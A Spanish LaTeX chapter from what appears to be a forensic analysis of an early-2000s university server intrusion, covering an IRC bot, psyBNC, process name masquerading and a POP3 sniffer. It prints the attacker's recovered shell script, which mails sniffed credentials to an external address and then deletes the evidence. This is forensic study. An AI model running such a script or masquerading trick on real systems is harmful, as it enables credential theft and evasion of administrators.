\chapter{Infraestructura Parásita: Bots IRC y Malware}

Durante los primeros años del siglo XXI, la motivación predominante de los atacantes que exploraban servidores de instituciones educativas no era el secuestro extorsivo de datos (\textit{ransomware}) ni la sustracción masiva de propiedad intelectual. El objetivo primordial consistía en la apropiación ilícita de ancho de banda y capacidad de cómputo para gobernar redes de retransmisión sobre el protocolo IRC (\textit{Internet Relay Chat}). 

En este capítulo se realiza la disección técnica de los artefactos localizados en el directorio \texttt{/dev}, desentrañando la arquitectura del \textit{malware}, las técnicas de camuflaje de procesos empleadas para evadir la detección y los mecanismos de interceptación y exfiltración de credenciales desplegados por los intrusos.

\section{Desglose de la Infraestructura Clandestina en \texttt{/dev}}

Tal como se identificó durante la fase de detección en vivo, el intruso utilizó el directorio \texttt{/dev} para depositar un conjunto de archivos con prefijo de punto, ocultándolos a las consultas convencionales de \texttt{ls}. El examen pormenorizado de estos archivos reveló que no se trataba de ejecutables binarios, sino de ficheros de configuración en texto plano que gobernaban la ejecución automática de los servicios parásitos.

El Cuadro~\ref{tab:archivos_ocultos_dev} sintetiza la función de cada archivo descubierto en el directorio de dispositivos.

\begin{table}[htbp]
\centering
\small
\begin{tabular}{llp{7.5cm}}
\toprule
\textbf{Archivo} & \textbf{Permisos / Dueño} & \textbf{Función Pericial Identificada} \\
\midrule
\texttt{/dev/.libn}  & \texttt{-rwxr-xr-x} (500:users) & Parámetros de red del servidor IRC y puertos de escucha. \\
\texttt{/dev/.libpt} & \texttt{-rwxr-xr-x} (500:users) & Diccionario de nombres falsos para camuflaje de procesos. \\
\texttt{/dev/.libtr} & \texttt{-rwxr-xr-x} (500:users) & Nombres de proceso alternativos para utilidades de captura. \\
\texttt{/dev/.libtp} & \texttt{-rwxr-xr-x} (500:users) & Lista de alias para binarios residentes en memoria. \\
\texttt{/dev/zqft4}  & \texttt{drwxr-xr-x} (500:users) & Directorio base del bot IRC \texttt{energyb} y ejecutables. \\
\bottomrule
\end{tabular}
\caption{Inventario de archivos clandestinos descubiertos en \texttt{/dev}.}
\label{tab:archivos_ocultos_dev}
\end{table}

\subsection{Parámetros de Comunicación y Enlace IRC (\texttt{.libn})}

El archivo \texttt{/dev/.libn} contenía una secuencia numérica y de texto que definía los parámetros de conexión del bot IRC hacia la infraestructura de comando y control (C2), como se muestra en el Listado~\ref{lst:libn_content}.

\begin{lstlisting}[style=terminal,caption={Contenido del archivo de parámetros de enlace /dev/.libn.},label={lst:libn_content}]
kis
ircd
6667
186
17749
56321
51759
\end{lstlisting}

La interpretación pericial de estos parámetros demostró que:
\begin{itemize}
    \item \texttt{kis} e \texttt{ircd} correspondían al alias del proceso en ejecución y al identificador de red.
    \item El puerto \textbf{6667} corresponde al puerto estándar del protocolo RFC 1459 (IRC).
    \item Los números restantes (\texttt{17749}, \texttt{56321}, \texttt{51759}) representaban puertos efímeros de escucha asignados para canales de comunicación directa punto a punto (\textit{DCC - Direct Client-to-Client}), empleados para la transferencia desasociada de archivos y control remoto interactivo.
\end{itemize}

\section{Técnicas de Evasión: Camuflaje de Procesos (\textit{Process Masquerading})}

Una de las técnicas más ilustrativas de la pericia fue el análisis de los archivos \texttt{/dev/.libpt}, \texttt{/dev/.libtr} y \texttt{/dev/.libtp}. Al inspeccionar su contenido, se constató que albergaban listados idénticos de cadenas de texto orientadas al engaño visual del administrador:

\begin{lstlisting}[style=terminal,caption={Lista de alias de procesos para camuflaje en /dev/.libpt.},label={lst:libpt_content}]
dnsquery
-bash
linux
sysinit
db
identd
plogd
screen
ecko
popclean
\end{lstlisting}

En sistemas GNU/Linux, cuando un ejecutable inicia su ejecución a través de la llamada al sistema \texttt{execve}, la función principal \texttt{main(int argc, char **argv)} recibe un arreglo de argumentos donde \texttt{argv[0]} define la cadena que el comando \texttt{ps} reportará en la columna de comando. 

Los programas maliciosos compilados por el atacante sobreescribían deliberadamente la memoria de \texttt{argv[0]} seleccionando cadenas aleatorias del archivo \texttt{.libpt}. Así, mientras el proceso real correspondía a un servidor de IRC clandestino o un capturador de tráfico, una inspección rutinaria con \texttt{ps aux} mostraba un proceso aparentemente inofensivo como \texttt{dnsquery}, \texttt{sysinit} o una sesión interactiva de \texttt{-bash}.

\section{Disección de los Servicios Parásitos: Energyb y psyBNC}

El subdirectorio \texttt{/dev/zqft4} albergaba el núcleo operativo de la intrusión. Dentro de esta estructura se localizaron dos herramientas emblemáticas de la escena informática de la época: el bot IRC \textbf{Energyb} y el servidor de retransmisión \textbf{psyBNC}.

\subsection{El Bot IRC Energyb}

\textit{Energyb} era un programa derivado de la familia de bots \textit{Eggdrop}, programado en lenguaje C y diseñado para mantener presencia continua en canales de chat, responder a órdenes predefinidas y coordinar ataques distribuidos de denegación de servicio (DDoS) por inundación de paquetes UDP y TCP SYN.

El bot operaba configurado para conectarse automáticamente a servidores externos de IRC tan pronto como el equipo iniciara, verificando su persistencia mediante scripts cíclicos ejecutados a través de tareas programadas de \texttt{cron}.

\subsection{El Bouncer psyBNC}

El servidor de retransmisión \textit{psyBNC} cumplía una función estratégica en el encubrimiento del atacante. Al operar como un \textit{proxy} de aplicación intermedio, permitía al atacante conectarse a la red IRC proyectando como dirección IP de origen la dirección legítima de la universidad (\texttt{192.0.2.10}). De este modo:
\begin{itemize}
    \item El operador real permanecía oculto tras la reputación institucional de la red universitaria.
    \item El intruso evitaba las listas de bloqueo de direcciones IP residenciales o de acceso conmutado impuestas por los servidores de IRC.
    \item Se garantizaba la persistencia de la sesión de chat incluso cuando el atacante desconectaba su enlace físico a Internet.
\end{itemize}

\section{Espionaje y Exfiltración de Credenciales: El Script popclean}

El hallazgo de mayor gravedad en términos de confidencialidad institucional fue el descubrimiento de un script de automatización alojado en \texttt{/usr/lib/} denominado \texttt{popclean}, acompañado de un script ejecutable de recolección cuya transcripción se presenta en el Listado~\ref{lst:popclean_script}.

\begin{lstlisting}[style=terminal,caption={Script de automatización para recolección y exfiltración de contraseñas POP3.},label={lst:popclean_script}]
#!/bin/sh
cd /usr/lib/
./popclean -r pop.log > test
mail eckosniffer@correo-externo.net -s "pop sniff" < test
rm -f test
\end{lstlisting}

\subsection{Mecánica Operativa de la Exfiltración}

El análisis funcional del script reveló una cadena de ataque estructurada:
\begin{enumerate}
    \item La herramienta \texttt{popclean} operaba como un analizador pasivo de paquetes (\textit{sniffer}) que monitoreaba la interfaz de red en el puerto TCP 110 (puerto estándar de lectura de correo POP3).
    \item En 2004, los clientes de correo tradicionales transmitían los comandos \texttt{USER} y \texttt{PASS} en texto claro sin cifrado TLS/SSL. La herramienta interceptaba el flujo de red local, extrayendo las cuentas y contraseñas de los profesores e investigadores del departamento.
    \item La salida formateada se volcaba temporalmente al archivo \texttt{test} y era inmediatamente transmitida mediante el comando estándar de sistema \texttt{mail} hacia una cuenta externa de correo electrónico (\texttt{eckosniffer@correo-externo.net}).
    \item Concluido el envío, el script borraba el archivo temporal para reducir las probabilidades de detección forense.
\end{enumerate}

\section{Conclusiones sobre el Nivel de Sofisticación del Malware}

La evidencia técnica obtenida en este capítulo permite perfilar con precisión las capacidades del intruso:
\begin{itemize}
    \item El despliegue simultáneo de bots IRC y de un capturador de tráfico POP3 confirma una convergencia de intereses: por un lado, la explotación parasitaria de recursos de red; por el otro, la recolección activa de contraseñas de usuarios institucionales.
    \item El empleo de técnicas de camuflaje de procesos en \texttt{argv[0]} demuestra un entendimiento funcional de la administración de sistemas Unix, aunque el uso de rutas fijas y scripts rudimentarios en shell evidencia el empleo de paquetes de ataque prediseñados (\textit{toolkits}) típicos de la época.
\end{itemize}
